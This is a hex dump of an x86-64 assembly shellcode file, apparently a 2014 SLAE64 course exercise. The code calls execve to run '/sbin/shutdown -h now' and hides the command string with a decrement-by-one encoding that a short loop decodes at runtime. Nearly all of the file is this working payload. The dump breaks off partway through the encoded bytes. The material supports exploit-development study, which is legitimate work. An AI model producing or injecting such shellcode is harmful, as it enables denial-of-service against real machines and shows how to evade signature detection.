00000000  3b 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |; ==============|
00000010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000040  3d 3d 3d 3d 3d 0a 3b 20  4f 70 74 69 6d 69 7a 65  |=====.; Optimize|
00000050  64 20 76 65 72 73 69 6f  6e 20 6f 66 20 73 68 65  |d version of she|
00000060  6c 6c 63 6f 64 65 20 61  74 3a 0a 3b 20 68 74 74  |llcode at:.; htt|
00000070  70 3a 2f 2f 73 68 65 6c  6c 2d 73 74 6f 72 6d 2e  |p://shell-storm.|
00000080  6f 72 67 2f 73 68 65 6c  6c 63 6f 64 65 2f 66 69  |org/shellcode/fi|
00000090  6c 65 73 2f 73 68 65 6c  6c 63 6f 64 65 2d 38 37  |les/shellcode-87|
000000a0  37 2e 70 68 70 0a 3b 20  41 75 74 68 6f 72 3a 20  |7.php.; Author: |
000000b0  53 4c 41 45 36 34 2d 31  33 35 31 20 28 4b 65 79  |SLAE64-1351 (Key|
000000c0  6d 61 6e 29 0a 3b 20 44  61 74 65 3a 20 31 34 2f  |man).; Date: 14/|
000000d0  30 39 2f 32 30 31 34 0a  3b 0a 3b 20 4c 65 6e 67  |09/2014.;.; Leng|
000000e0  74 68 3a 20 36 34 20 62  79 74 65 73 20 28 67 6f  |th: 64 bytes (go|
000000f0  74 20 73 68 6f 72 74 65  72 20 62 79 20 31 20 62  |t shorter by 1 b|
00000100  79 74 65 20 3a 44 20 29  0a 3b 0a 3b 20 57 68 61  |yte :D ).;.; Wha|
00000110  74 27 73 20 6e 65 77 20  69 73 20 74 68 61 74 20  |t's new is that |
00000120  73 6f 6d 65 20 6f 70 74  69 6d 61 6c 69 7a 61 74  |some optimalizat|
00000130  69 6f 6e 20 77 61 73 20  70 65 72 66 6f 72 6d 65  |ion was performe|
00000140  64 20 6f 6e 20 74 68 65  0a 3b 20 6f 72 69 67 69  |d on the.; origi|
00000150  6e 61 6c 20 63 6f 64 65  20 77 68 69 63 68 20 6c  |nal code which l|
00000160  65 66 74 20 73 6f 6d 65  20 73 70 61 63 65 20 74  |eft some space t|
00000170  6f 20 64 6f 20 61 20 62  61 73 69 63 20 64 65 63  |o do a basic dec|
00000180  6f 64 69 6e 67 20 6f 66  20 74 68 65 0a 3b 20 63  |oding of the.; c|
00000190  6f 6d 6d 61 6e 64 20 28  2f 73 62 69 6e 2f 73 68  |ommand (/sbin/sh|
000001a0  75 74 64 6f 77 6e 29 2e  20 45 61 63 68 20 62 79  |utdown). Each by|
000001b0  74 65 20 28 65 78 63 65  70 74 20 74 68 65 20 66  |te (except the f|
000001c0  69 72 73 74 20 6f 6e 65  29 20 77 61 73 0a 3b 20  |irst one) was.; |
000001d0  64 65 63 72 65 6d 65 6e  74 65 64 20 62 79 20 31  |decremented by 1|
000001e0  2e 20 54 68 65 20 64 65  63 6f 64 65 72 20 6a 75  |. The decoder ju|
000001f0  73 74 20 61 64 64 73 20  31 20 74 6f 20 65 61 63  |st adds 1 to eac|
00000200  68 20 62 79 74 65 2e 0a  3b 0a 3b 20 3d 3d 3d 3d  |h byte..;.; ====|
00000210  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000240  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 0a  |===============.|
00000250  20 0a 73 65 63 74 69 6f  6e 20 2e 74 65 78 74 0a  | .section .text.|
00000260  67 6c 6f 62 61 6c 20 5f  73 74 61 72 74 0a 20 0a  |global _start. .|
00000270  5f 73 74 61 72 74 3a 0a  20 0a 78 6f 72 20 72 61  |_start:. .xor ra|
00000280  78 2c 20 72 61 78 20 20  20 20 20 20 20 20 20 20  |x, rax          |
00000290  20 20 20 20 20 20 3b 20  63 6c 65 61 72 20 72 61  |      ; clear ra|
000002a0  78 20 61 6e 64 20 72 64  78 0a 63 64 71 0a 20 0a  |x and rdx.cdq. .|
000002b0  3b 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |; --------------|
000002c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000002f0  2d 2d 2d 2d 2d 0a 3b 20  31 2e 20 73 74 6f 72 65  |-----.; 1. store|
00000300  20 27 2d 68 27 20 6f 6e  20 73 74 61 63 6b 0a 3b  | '-h' on stack.;|
00000310  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
00000320  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000350  2d 2d 2d 2d 0a 20 0a 70  75 73 68 20 72 61 78 0a  |----. .push rax.|
00000360  70 75 73 68 20 77 6f 72  64 20 30 78 36 38 32 64  |push word 0x682d|
00000370  20 3b 2d 68 0a 70 75 73  68 20 72 73 70 0a 70 6f  | ;-h.push rsp.po|
00000380  70 20 72 63 78 0a 20 0a  3b 20 2d 2d 2d 2d 2d 2d  |p rcx. .; ------|
00000390  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 3b 20  |-------------.; |
000003d0  32 2e 20 73 74 6f 72 65  20 27 6e 6f 77 27 20 6f  |2. store 'now' o|
000003e0  6e 20 73 74 61 63 6b 0a  3b 20 2d 2d 2d 2d 2d 2d  |n stack.; ------|
000003f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000420  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 20 0a  |-------------. .|
00000430  70 75 73 68 20 72 61 78  0a 70 75 73 68 20 62 79  |push rax.push by|
00000440  74 65 20 30 78 37 37 0a  70 75 73 68 20 77 6f 72  |te 0x77.push wor|
00000450  64 20 30 78 36 66 36 65  20 3b 20 6e 6f 77 0a 70  |d 0x6f6e ; now.p|
00000460  75 73 68 20 72 73 70 0a  70 6f 70 20 72 62 78 0a  |ush rsp.pop rbx.|
00000470  20 0a 70 75 73 68 20 72  61 78 0a 70 75 73 68 20  | .push rax.push |
00000480  72 62 78 0a 70 75 73 68  20 72 63 78 0a 20 0a 3b  |rbx.push rcx. .;|
00000490  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
000004a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000004d0  2d 2d 2d 2d 0a 3b 20 33  2e 20 73 74 6f 72 65 20  |----.; 3. store |
000004e0  27 2f 73 62 69 6e 2f 73  68 75 74 64 6f 77 6e 27  |'/sbin/shutdown'|
000004f0  20 6f 6e 20 73 74 61 63  6b 0a 3b 20 2d 2d 2d 2d  | on stack.; ----|
00000500  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000530  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 0a  |---------------.|
00000540  20 0a 70 75 73 68 20 72  73 70 0a 70 6f 70 20 72  | .push rsp.pop r|
00000550  73 69 0a 20 0a 70 75 73  68 20 72 61 78 0a 6a 6d  |si. .push rax.jm|
00000560  70 20 73 68 75 74 64 6f  77 6e 0a 63 6f 6e 74 3a  |p shutdown.cont:|
00000570  0a 70 6f 70 20 72 64 69  0a 20 0a 70 75 73 68 20  |.pop rdi. .push |
00000580  31 35 0a 70 6f 70 20 72  63 78 0a 20 0a 64 6f 5f  |15.pop rcx. .do_|
00000590  61 64 64 3a 0a 20 20 20  20 61 64 64 20 62 79 74  |add:.    add byt|
000005a0  65 20 5b 72 64 69 2b 72  63 78 5d 2c 20 30 78 30  |e [rdi+rcx], 0x0|
000005b0  31 0a 20 20 20 20 6c 6f  6f 70 20 64 6f 5f 61 64  |1.    loop do_ad|
000005c0  64 0a 20 0a 70 75 73 68  20 35 39 0a 70 6f 70 20  |d. .push 59.pop |
000005d0  72 61 78 0a 73 79 73 63  61 6c 6c 0a 20 0a 73 68  |rax.syscall. .sh|
000005e0  75 74 64 6f 77 6e 3a 0a  20 20 20 20 63 61 6c 6c  |utdown:.    call|
000005f0  20 63 6f 6e 74 0a 20 20  20 20 63 5f 31 3a 20 64  | cont.    c_1: d|
00000600  62 20 30 78 32 66 2c 20  30 78 32 65 2c 20 30 78  |b 0x2f, 0x2e, 0x|
00000610  32 65 2c 20 30 78 37 32  2c 20 30 78 36 31 2c 20  |2e, 0x72, 0x61, |
00000620  30 78 36 38 2c 20 30 78  36 64 2c 20 30 78 32 65  |0x68, 0x6d, 0x2e|
00000630  2c 20 30 78 37 32 2c 20  30 78 36 37 2c 20 30 78  |, 0x72, 0x67, 0x|
00000640  37 34 2c 20 30 78 37 33  2c 20 30 78 36 33 2c 20  |74, 0x73, 0x63, |
00000650  30 78 36 65 2c 20 30 78  37 36 2c 20 30 78 36 64  |0x6e, 0x76, 0x6d|
00000660
